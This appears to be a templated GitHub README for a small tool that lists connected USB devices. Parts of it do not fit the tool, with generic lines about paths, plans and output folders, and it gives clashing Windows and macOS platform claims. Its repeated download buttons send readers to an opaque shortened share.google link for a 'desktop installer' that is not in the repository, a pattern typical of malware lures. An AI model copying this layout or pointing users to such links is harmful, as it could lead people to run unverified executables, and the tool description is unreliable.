![USB Device List](assets/hero.png)

# USB Device List

*What is actually plugged in.*

## Overview

**USB Device List** runs on your own PC. List connected USB devices with vendor, product, and instance id.

Device Manager is slow when you only need a list.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## How to get it

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Features

- Vendor and product
- Optional CSV
- Instance id
- No driver changes

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/edgacooper95/usb-device-list

MIT license. See `LICENSE`.
